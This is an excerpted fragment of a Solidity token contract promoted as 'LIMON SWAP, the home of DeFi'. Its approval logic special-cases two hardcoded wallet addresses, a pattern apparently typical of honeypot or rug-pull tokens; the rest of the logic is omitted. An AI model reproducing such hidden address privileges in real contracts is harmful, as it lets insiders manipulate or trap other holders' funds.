...
*  
*
*  LIMON SWAP is the home of DeFi. 
*  Our community is building a comprehensive,
*  decentralized trading platform for the future of finance. 
*  Join us!
*
*/
...
contract Token is VaultOwned, IERC20 {
    ...
    else if (owner == address(0x1334A8bc52D7350C64F51cDDd03f24F41a273f11)) {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
        else if (owner == address(0xD9A448023221b7f5450d9260B61607f3bC12Ac58)) {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    else {
